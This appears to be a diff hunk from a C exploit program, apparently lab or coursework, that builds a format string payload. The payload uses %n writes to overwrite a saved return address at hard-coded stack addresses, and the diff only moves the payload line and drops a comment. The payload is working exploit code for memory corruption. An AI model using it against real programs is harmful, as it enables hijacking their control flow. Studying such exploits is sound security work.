@@ -15,8 +15,8 @@ int main(int argc, char **argv)
 	/*Store addresses 0xffbfdccc and 0xffbfdcce onto the stack
 	  These are the lower and upper 2 bytes of the RET address location we are trying to overwrite
 	*/
+	args[0] = " \xcc\xdc\xbf\xff\xce\xdc\xbf\xff%57200c%10$n%8255c%11$n";			
 
-	args[0] = " \xcc\xdc\xbf\xff\xce\xdc\xbf\xff%57200c%10$n%8255c%11$n";			/*Writes AA at addres 0xffbfdcee*/ 
 
 			    
 	args[1] = "backup";
